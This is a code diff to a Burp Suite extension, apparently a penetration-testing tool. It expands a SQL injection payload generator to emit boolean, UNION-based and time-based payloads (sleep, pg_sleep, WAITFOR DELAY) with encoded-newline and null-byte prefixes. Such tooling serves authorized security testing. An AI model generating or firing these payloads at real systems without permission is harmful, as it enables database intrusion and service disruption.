@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.22"
+VERSION = "0.24"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -690,41 +690,51 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcSQLi(self, ev):
         listSQLi = []
-        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
+        prefixes = ["", "\\n", "\\r", "%0a", "0x0a", "%0d", "0x0d", "%00", "0x00"]
+        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\""]
         delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
-        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
+        delimeterEnds = ["", ";", " -- ", "; -- "]
 
-        for delimeterStart in delimeterStarts:
-            for delimeterBoolean in delimeterBooleans:
+        for prefix in prefixes:
+            for delimeterStart in delimeterStarts:
+                for delimeterBoolean in delimeterBooleans:
+                    for delimeterEnd in delimeterEnds:
+                        listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
+        
+        for prefix in prefixes:
+            for delimeterStart in delimeterStarts:
                 for delimeterEnd in delimeterEnds:
-                    listSQLi.append(delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + delimeterEnd + "\n")
 
-        delimeterStarts = ["'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
-        delimeterEnds = [" --", " #", "; --", "; #"]
-        for delimeterStart in delimeterStarts:
-            for delimeterEnd in delimeterEnds:
-                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
-                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
-                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
-                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
-                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + "\n")
-                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + "\n")
-                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
-                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
+        for prefix in prefixes:
+            for delimeterStart in delimeterStarts:
+                for delimeterEnd in delimeterEnds:
+                    unionPhrase = " UNION ALL SELECT "
+                    for i in range(10):
+                        unionPhrase += "1337"+ str(i)
+                        listSQLi.append(prefix + delimeterStart + unionPhrase + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " sleep(100)") + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " pg_sleep(100)") + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart) + delimeterEnd + "\n")
+                        unionPhrase += ","
 
-        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
-        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
-        for delimeterStart in delimeterStarts:
-            for delimeterEnd in delimeterEnds:
-                listSQLi.append(delimeterStart + delimeterEnd + "\n")
-                listSQLi.append(delimeterStart + delimeterEnd + "\n")
-
-        listSQLi = [elem for elem in listSQLi if elem.strip()]
+        for prefix in prefixes:
+            for delimeterStart in delimeterStarts[1:]:
+                for delimeterEnd in delimeterEnds[1:]:
+                    listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
+                    listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
+                    listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + "\n")
+                    listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + "\n")
+                    listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
+        
         listSQLi = list(set(listSQLi))
         listSQLi.sort(reverse=True)
 
         self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
-        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' records.') 
+        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' records. It contains Boolean-Based, Union-Based and Time-Based injection payloads! You can grep \'1337\' keyword in the Http response. ') 
         return
 
     def getTabCaption(self):
